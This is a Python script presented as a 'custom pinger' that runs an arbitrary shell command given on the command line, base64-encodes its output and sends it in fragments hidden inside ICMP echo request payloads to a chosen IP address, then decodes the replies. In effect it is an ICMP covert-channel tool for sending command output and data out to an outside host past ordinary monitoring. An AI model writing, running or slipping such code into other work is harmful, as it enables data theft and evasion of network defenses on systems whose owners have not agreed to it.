import sys
import socket
import struct
import random
import math
import subprocess
import base64
import time

class CustomPinger:
    def __init__(self, dest_addr, max_payload_size=1024, timeout=5):
        """
        Initialize the custom pinger with multiple Echo Request handling
        """
        self.dest_addr = dest_addr
        self.max_payload_size = max_payload_size
        self.timeout = timeout
        
        try:
            # Create raw sockets for sending and receiving
            icmp = socket.getprotobyname("icmp")
            self.send_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
            self.recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            # Set socket timeout
            self.recv_socket.settimeout(self.timeout)
        except PermissionError:
            print("Error: You need root/admin privileges to send raw packets.")
            sys.exit(1)

    def checksum(self, data):
        """Calculate the checksum of the IP header"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        if len(data) % 2 == 1:
            data += b'\x00'
        
        words = struct.unpack('!%dH' % (len(data) // 2), data)
        checksum_sum = sum(words)
        
        while checksum_sum >> 16:
            checksum_sum = (checksum_sum & 0xFFFF) + (checksum_sum >> 16)
        
        return ~checksum_sum & 0xFFFF

    def create_packet(self, payload_string, sequence, total_packets):
        """Create an packet with custom payload"""
        custom_header = struct.pack('HH', sequence, total_packets)
        payload_bytes = base64.b64encode(payload_string.encode('utf-8'))
        
        packet_id = random.randint(1, 65535)
        icmp_header = struct.pack('bbHHh', 8, 0, 0, packet_id, 1)
        
        full_payload = custom_header + payload_bytes
        my_checksum = self.checksum(icmp_header + full_payload)
        
        icmp_header = struct.pack('bbHHh', 8, 0, socket.htons(my_checksum), 
                                  packet_id, 1)
        
        packet = icmp_header + full_payload
        return packet, packet_id

    def send_fragmented_payload(self, payload):
        """
        Send payload divided into multiple  packets and wait for all replies
        """
        total_packets = math.ceil(len(payload.encode('utf-8')) / self.max_payload_size)
        
        try:
            sent_packet_ids = {}
            packet_responses = {}
            base64_payload = payload.encode('utf-8')
            # Send each fragment
            for i in range(total_packets):
                
                start = i * self.max_payload_size
                end = start + self.max_payload_size
                current_fragment = base64_payload[start:end]
                
                packet, packet_id = self.create_packet(current_fragment.decode('utf-8'), i+1, total_packets)
                sent_packet_ids[packet_id] = {'sequence': i+1, 'total': total_packets}
                
                self.send_socket.sendto(packet, (self.dest_addr, 1))
                print(f"Sent fragment {i+1}/{total_packets} to {self.dest_addr}")

            # Wait and collect responses for all packets
            start_time = time.time()
            while sent_packet_ids and time.time() - start_time < self.timeout:
                try:
                    recv_packet, addr = self.recv_socket.recvfrom(65565)
                    
                    icmp_header = recv_packet[20:28]
                    icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq = struct.unpack('bbHHh', icmp_header)
                    
                    # Check for Echo Reply (type 0)
                    if icmp_type == 0 and icmp_id in sent_packet_ids:
                        custom_header = recv_packet[28:32]
                        sequence, total_packets = struct.unpack('HH', custom_header)
                        
                        base64_payload = recv_packet[32:].decode('utf-8').rstrip('\x00')
                        
                        if icmp_id not in packet_responses:
                            packet_responses[icmp_id] = []
                        
                        packet_responses[icmp_id].append({
                            'sequence': sequence,
                            'payload': base64_payload
                        })
                        
                        # Remove packet ID if all fragments received
                        packet_info = sent_packet_ids[icmp_id]
                        if len(packet_responses[icmp_id]) == packet_info['total']:
                            del sent_packet_ids[icmp_id]

                except socket.timeout:
                    break

            # Process and decode received responses
            all_responses = []
            print("Jasotakoa:")
            for packet_id, responses in packet_responses.items():
                # Sort responses by sequence
                responses.sort(key=lambda x: x['sequence'])
                
                # Concatenate base64 payloads
                full_base64_payload = ''.join(resp['payload'] for resp in responses)
                
                # Decode base64
                decoded_payload = base64.b64decode(full_base64_payload).decode('utf-8')
                all_responses.append(decoded_payload)
                print(decoded_payload)

            return all_responses if all_responses else None

        except socket.error as e:
            print(f"Socket error: {e}")
        
        finally:
            self.send_socket.close()
            self.recv_socket.close()

def execute_command(bash_command):
    """Execute a bash command and return its output"""
    try:
        result = subprocess.run(bash_command, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            print(f"Command error: {result.stderr}")
            return f"Command failed with return code {result.returncode}"
    
    except Exception as e:
        print(f"Execution error: {e}")
        return f"Execution failed: {str(e)}"

def main():
    if len(sys.argv) != 3:
        print("Usage: sudo python3 bidaltzen.py <ip_address> '<bash_command>'")
        sys.exit(1)

    ip_address = sys.argv[1]
    bash_command = sys.argv[2]

    payload = execute_command(bash_command)

    pinger = CustomPinger(ip_address)
    pinger.send_fragmented_payload(payload)

if __name__ == "__main__":
    main()